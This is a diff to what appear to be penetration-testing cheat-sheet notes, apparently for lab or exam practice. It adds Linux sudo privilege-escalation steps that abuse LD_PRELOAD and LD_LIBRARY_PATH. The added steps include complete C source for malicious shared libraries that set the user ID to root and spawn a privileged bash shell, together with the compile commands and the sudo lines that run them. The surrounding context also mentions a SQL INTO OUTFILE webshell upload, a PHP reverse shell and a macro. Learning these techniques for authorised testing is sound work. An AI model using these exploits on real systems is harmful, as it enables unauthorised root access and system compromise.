@@ -194,14 +194,91 @@ find / -name "local.txt" 2>/dev/null
 find / -name "proof.txt" 2>/dev/null
 ```
 
-###### SUDO exploitation : 
+##### SUDO exploitation : 
+
+###### Shell Escape Sequences : 
 programs "user" allowed to run via sudo
 ```
 sudo -l 
 ```
 go to gtfo bins
 and use sudo before command as `sudo <command>`
+###### Environment Variables : 
+```
+sudo -l 
+```
+Look for :
+```
+env_keep += LD_PRELOAD
+env_keep += LD_LIBRARY_PATH
+```
 
+for LD_PRELOAD : 
+make exploit 
+```
+nano preload.c
+```
+paste code : 
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+compile it 
+```
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+```
+This creates:
+```
+/tmp/preload.so
+```
+Then run one of the permitted programs while specifying the library:
+```
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+#ex. any of the complete paths from the `sudo -l` list like "/usr/sbin/apache2"
+# not all executables will work , try until one works
+```
+
+for LD_LIBRARY_PATH : 
+Find which shared libraries the target binary depends on after seeing from `sudo -l`
+```
+ldd /usr/sbin/apache2
+# or you can use any executable path from `sudo -l` results
+```
+Pick a library name from this list — e.g. **`libcrypt.so.1`** ; not all libraries will work , try until one works
+Create your own library : 
+```
+nano library_path.c
+```
+paste code : / Create the Malicious Shared Object : 
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+compile it : 
+```
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
+#put the library name from the list we found out 
+```
+run : 
+```
+sudo LD_LIBRARY_PATH=/tmp apache2
+# use same executable you choose in starting whose you saw library path for 
+```
 
 ##### SUID Executables : 
 ###### Known exploits : 
@@ -490,14 +567,12 @@ INTO OUTFILE 'C:/wamp/www/uploader.php';
 ```
 after that , upload `PHP Ivan Sincek` revershell to the website
 
-
-Squid Proxy :
+###### Squid Proxy :
 configure FoxyProxy extension 
 with port number and ip address of victim machine 
 and then load the website 
 
-
-Macro :
+###### Macro :
 ```vb
 Sub MyMacro
 	Dim str as String
